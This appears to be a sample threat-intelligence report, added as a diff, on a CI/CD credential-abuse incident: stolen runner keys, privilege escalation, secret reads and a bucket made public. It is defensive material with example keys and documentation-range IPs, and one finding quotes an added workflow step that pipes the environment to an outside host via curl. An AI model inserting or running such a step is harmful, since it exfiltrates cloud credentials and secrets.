@@ -1,0 +1,30 @@
+==============================================================================
+GraySentinel RIU · Cloud Token Blackout — CI/CD credential-abuse intel
+==============================================================================
+Classification: Supply-chain abuse + cloud takeover
+Kill-chain stages observed: collection -> credential access -> credential access / cloud auth -> exfiltration / persistence -> initial access -> persistence -> privilege escalation -> runner compromise
+
+CLOUD FINDINGS:
+  [IoC   ] credential access / cloud auth 2026-10-06T01:20:00Z  GetCallerIdentity      203.0.113.77  — IAM user key AKIAEXAMPLE7RUNNER01 from 203.0.113.77 (hosting ASN), non-CI user-agent, no MFA
+  [IoC   ] privilege escalation         2026-10-06T01:22:00Z  CreateAccessKey        203.0.113.77  — CreateAccessKey on user/runner-deploy
+  [IoC   ] privilege escalation         2026-10-06T01:23:00Z  AttachUserPolicy       203.0.113.77  — AttachUserPolicy on user/runner-deploy
+  [IoC   ] collection                   2026-10-06T01:26:00Z  GetObject              203.0.113.77  — GetObject arn:aws:s3:::example-prod-pii
+  [IoC   ] collection                   2026-10-06T01:26:20Z  GetObject              203.0.113.77  — GetObject arn:aws:s3:::example-db-backups
+  [IoC   ] credential access            2026-10-06T01:27:00Z  GetSecretValue         203.0.113.77  — GetSecretValue prod/db/master
+  [IoC   ] exfiltration / persistence   2026-10-06T01:29:00Z  PutBucketPolicy        203.0.113.77  — PutBucketPolicy arn:aws:s3:::example-prod-pii — policy allows Principal:* GetObject
+  [REVIEW] persistence                  2026-10-06T01:30:00Z  CreateUser             203.0.113.77  — CreateUser AccessDenied
+
+CI/CD (GitHub) FINDINGS:
+  [IoC   ] runner compromise    2026-10-06T01:05:00Z  ex.contractor  203.0.113.77  — added step: env | curl -X POST cdn-sync.example.net
+  [IoC   ] initial access       2026-10-06T01:05:00Z  ex.contractor  203.0.113.77  — terminated identity still referenced in automation
+  [IoC   ] initial access       2026-10-06T01:08:00Z  ex.contractor  203.0.113.77  — terminated identity still referenced in automation
+  [IoC   ] initial access       2026-10-06T01:11:00Z  ex.contractor  203.0.113.77  — terminated identity still referenced in automation
+  [IoC   ] credential access    2026-10-06T01:11:00Z  ex.contractor  203.0.113.77  — AWS_* env exposed to step
+
+IoC SUMMARY:
+  principals     runner-deploy
+  access_keys    AKIAEXAMPLE7RUNNER01
+  source_ips     203.0.113.77
+  buckets        arn:aws:s3:::example-db-backups, arn:aws:s3:::example-prod-pii
+  new_keys       new key AKIAEXAMPLEN3WKEY99 created
+  public_buckets arn:aws:s3:::example-prod-pii
